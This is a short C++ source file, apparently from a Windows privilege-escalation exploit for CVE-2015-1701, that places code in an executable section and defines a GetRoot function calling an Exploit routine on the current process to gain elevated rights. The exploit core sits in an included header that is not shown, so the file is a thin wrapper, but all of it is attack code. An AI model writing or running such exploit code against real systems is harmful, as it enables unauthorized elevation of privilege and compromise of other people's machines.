#include "EoP.h"
#pragma section("wineop", read, execute)
#pragma code_seg("wineop")

using namespace CVE_2015_1701;

void GetRoot( __inout ENVIRONMENT *lpEnv)
{
	Exploit(lpEnv, CURRENT_PID, NULL, NO_PROCESS);
}